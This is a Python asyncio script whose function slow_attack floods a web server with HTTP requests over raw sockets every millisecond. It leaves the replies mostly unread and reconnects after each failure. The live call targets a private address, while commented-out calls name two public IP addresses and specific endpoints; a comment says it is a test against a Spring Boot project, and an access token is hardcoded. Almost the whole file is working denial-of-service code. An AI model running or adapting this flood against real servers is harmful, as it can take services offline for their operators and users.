import asyncio
from urllib.parse import urlencode
import re
import urllib.parse
import json
import gzip
import io

async def send_request(writer, host, url, params, data):
    # 将 params 和 data 合并到一个字典中
    data_dict = {**params, **data}
    
    # 将字典转换为 URL 编码的格式
    data_str = urllib.parse.urlencode(data_dict)
    
    while True:
        # 发送请求的首行
        request_line = f"POST {url} HTTP/1.1\r\n"
        writer.write(request_line.encode("utf-8"))
        # await writer.drain()
        # await asyncio.sleep(5)  # 等待一段时间后再次发送请求
        
        # 发送请求头
        headers = {
            "Host": host,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data_str))
        }
        for header, value in headers.items():
            header_line = f"{header}: {value}\r\n"
            writer.write(header_line.encode("utf-8"))
            
        # await writer.drain()
        # await asyncio.sleep(5)  # 等待一段时间后再次发送请求
        
        # 发送一个额外的换行符来表示头部的结束
        writer.write("\r\n".encode("utf-8"))
        # 发送请求体
        writer.write(data_str.encode("utf-8"))
        await writer.drain()
        await asyncio.sleep(0.001)  # 等待一段时间后再次发送请求


async def send_request_yun(writer, method, host, url, params, data, interval):
    data_dict = {**params, **data}
    data_str = urllib.parse.urlencode(data_dict)

    while True:
        request_line = f"{method} {url} HTTP/1.1\r\n"
        writer.write(request_line.encode("utf-8"))

        headers = {
            "Host": host,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data_str)),
            "User-Agent": "Python-urllib/3.7"  # 添加一个User-Agent头
        }
        for header, value in headers.items():
            header_line = f"{header}: {value}\r\n"
            writer.write(header_line.encode("utf-8"))

        writer.write("\r\n".encode("utf-8"))
        writer.write(data_str.encode("utf-8"))
        await writer.drain()
        # await asyncio.sleep(interval)  # 根据参数控制请求间隔
        await asyncio.sleep(0.001)  # 根据参数控制请求间隔


# 编译一个正则表达式来匹配HTTP响应的状态行
status_line_re = re.compile(r"^HTTP/1\.[01] \d{3} .*\r\n$")

async def receive_response(reader):
    while True:
        # 读取状态行
        while True:
            status_line = await reader.readline()
            if status_line_re.match(status_line.decode('utf-8')):
                break  # 读取到了状态信息
            # print("Did not receive status line. Waiting...")
        await asyncio.sleep(10000)

        # 读取头部
        headers = {}
        while True:
            header_line = await reader.readline()
            if header_line == b'\r\n':
                break  # 头部结束
            header, _, value = header_line.decode('utf-8').partition(':')
            headers[header.lower()] = value.strip()
        print(f"Headers: {headers}")

        # 读取主体
        if 'transfer-encoding' in headers and headers['transfer-encoding'] == 'chunked':
            # 读取分块传输编码的主体
            while True:
                # 读取块长度
                length_line = await reader.readline()
                length = int(length_line, 16)
                if length == 0:
                    lx = await reader.readline()
                    print(lx)
                    break  # 结束
                # 读取块内容
                chunk = await reader.readexactly(length)
                if 'content-encoding' in headers and headers['content-encoding'] == 'gzip':
                    chunk = gzip.decompress(chunk)
                print(f"Chunk: {chunk.decode('utf-8')}")
                # 读取块之后的回车换行符
                ll = await reader.readline()
                print(ll)
        elif 'content-length' in headers:
            # 读取普通的主体
            length = int(headers['content-length'])
            body = await reader.readexactly(length)
            if 'content-encoding' in headers and headers['content-encoding'] == 'gzip':
                body = gzip.decompress(body)
            print(f"Body: {body.decode('utf-8')}")

        # await asyncio.sleep(1)  # 每接收一个完整的响应后休息1秒钟



token = 'sgdsgdsikhuewikdnjlkgh'

async def slow_attack(host, port, path):
    # 请求的 URL
    url = "/node/get"
    url = "/test/abtest"
    # 请求的数据
    params = {'token': token, 'path': path}
    data = {'api': '/get', 'nodePath': path}
    while True:
        reader, writer = None, None
        try:
            reader, writer = await asyncio.open_connection(host, port)
            # send_coro = send_request(writer, host, url, params=params, data= data)
            send_coro = send_request_yun(writer, 'GET' ,host, url, params=params, data= data, interval=1 )
            receive_coro = receive_response(reader)
            await asyncio.gather(send_coro, receive_coro)
        except Exception as e:
            print(f"Error in slow_attack: {e}")
        finally:
            await asyncio.sleep(5)  # 等待一段时间后再次尝试连接服务器



# asyncio.run(slow_attack("8.131.101.60", 8888,'/ydhxg/DingJu/TeSeZhiBiaoXuanGu'))
asyncio.run(slow_attack("192.168.1.29", 8888,'/test/abtest'))

# 下面的代码是测试基于spring boot项目的代码。
# async def slow_attack(host, port):
#     # 请求的 URL
#     url = "/qianglong/getyijiansandiao"
#     # 请求的数据
#     params = {"bkmc": "yd_1_sec_8", "tszb": "蓝粉彩带蓝变粉"}
#     data = {'data1': 'value1', 'data2': 'value2'}
#     encoded_params = urlencode(params)
#     while True:
#         reader, writer = None, None
#         try:
#             reader, writer = await asyncio.open_connection(host, port)
#             send_coro = send_request(writer, host, url, params=params, data= data)
#             receive_coro = receive_response(reader)
#             await asyncio.gather(send_coro, receive_coro)
#         except Exception as e:
#             print(f"Error in slow_attack: {e}")
#         finally:
#             await asyncio.sleep(5)  # 等待一段时间后再次尝试连接服务器



# asyncio.run(slow_attack("39.97.183.165", 8886))
